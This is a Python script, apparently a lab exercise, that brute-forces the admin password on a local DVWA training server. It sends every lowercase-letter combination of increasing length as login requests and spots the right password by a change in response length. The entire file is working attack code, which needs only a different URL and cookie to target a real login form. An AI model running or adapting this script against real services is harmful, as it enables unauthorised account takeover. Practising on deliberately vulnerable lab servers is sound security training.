#! /usr/bin/python

##CONTEXT:
#DVWA Server installed on a Debian VM
#LINE 45; SET LENGTH WHATEVER YOU WANT, if you want to try the tool, which is non multiprocessing, it might take a lot of time
#LINE 45 is the entry point for the password generation.

#Lib import
import requests
from itertools import product

#Connection setup to DVWA
url ="http://127.0.0.1/DVWA/vulnerabilities/brute/"
cookie={'PHPSESSID':'9urvd75j33m8qp56grao7i41lo','security':'low'}
req=requests.get(url,cookies=cookie)
#print(req.content)

#Hard coded list 
#lst = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]

#Another way to do it
#Basic, nowadays passwords have numbers, special symbols..
lst = [chr(i) for i in range(97,122+1)]

#debug print
#print(lst)

#Sep for presentation
print("------------------------")

#First query
#Intended to get a refused connection, we want to get the wrong log/pass response
#So that we can compare it to the new queries we're trying
#Login: a // Pass: a
r = requests.get("http://127.0.0.1/DVWA/vulnerabilities/brute/?username=a&password=a&Login=Login#",cookies=cookie)

#String length
wrong_req_len = len(r.content)

#debug print
#print(wrong_req_len)
#print(len(r.text))


#pass length starting point
pass_len = 4


g = requests.get("http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&password=toor&Login=Login#",cookies=cookie)

#debug
#print(len(g.content))
#print(len(g.text))


#info confirmation
input("Press enter to continue and start the attack...")


#Bad Practice, use bool preferably
#You can do it as a function too.
while True: 
    #Passw attempt declaration
    passw = ""
    counter = 0
    #Itertools magic
    #Basically here we generate tuples from all possibilites using a specific length
    #Two ways:
    #1: Not really optimised, the type is tuple, annoying to work with.
    #1:pass_list = [i for i in product(lst,repeat=pass_len)]
    #2: Using join method, better, easier.
    
    pass_list = [''.join(map(str,i)) for i in product(lst,repeat=pass_len)]
    #''.join() method translates given args as one string
    #map() will do a method to second arg, here i has type<str>
    #product(), given a list, will make all possible combinations, second-arg times
    
    for p in pass_list:
        counter+=1
        new_try = requests.get("http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&password="+p+"&Login=Login#",cookies=cookie)
        
        #debug
        #print(p)
        
        #checking if response length has changed, meaning by this, if it does, we got the pass ^^
        #debug print
        #print(len(new_try.content))
        

        if len(new_try.content) != wrong_req_len:
            print("\nYEEEEEEHAAAWWWW\n\n")
            print("Your pass:",p)
            exit(0)
        
        #format for the beauty (useless)
        out = str(counter)
        print(out+" tries\r",end="")
    pass_len+=1
        


    
